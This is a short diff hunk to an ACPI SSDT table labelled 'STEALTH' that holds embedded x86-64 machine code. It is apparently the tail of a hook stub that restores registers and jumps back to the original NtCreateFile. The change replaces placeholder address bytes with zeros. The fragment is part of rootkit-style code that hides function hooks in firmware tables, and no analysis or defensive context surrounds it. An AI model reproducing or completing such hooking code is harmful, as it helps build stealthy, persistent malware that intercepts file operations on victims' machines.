@@ -27,7 +27,7 @@ DefinitionBlock ("SSDT", "SSDT", 2, "OEMID", "STEALTH", 0x00000002)
         0x59,                                           // pop rcx
         0x58,                                           // pop rax
         // --- JMP to Original Function ---
-        0x48, 0xB8, 0xXX, 0xXX, 0xXX, 0xXX, 0xXX, 0xXX, 0xXX, 0xXX, // mov rax, &Original_NtCreateFile
+        0x48, 0xB8, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, // mov rax, &Original_NtCreateFile
         0xFF, 0xE0                                      // jmp rax
     })
 
